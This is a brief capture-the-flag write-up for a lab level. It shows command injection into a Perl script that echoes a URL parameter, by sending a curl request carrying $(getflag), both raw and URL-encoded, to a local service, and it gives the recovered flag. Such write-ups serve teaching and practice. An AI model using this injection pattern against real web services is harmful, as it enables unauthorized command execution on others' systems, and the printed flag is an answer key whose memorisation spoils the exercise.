# Level 04

We got a perl script that takes the argument of the url and echoes it using echo

We can exploit that by executing a subshell in the echo

```
curl "localhost:4747?x=$(getflag)"
```

This is a url so we have to encode the invalid characters

```
curl "localhost:4747?x=%24%28getflag%29"
```


**Flag** : ne2searoevaevoem4ov4ar8ap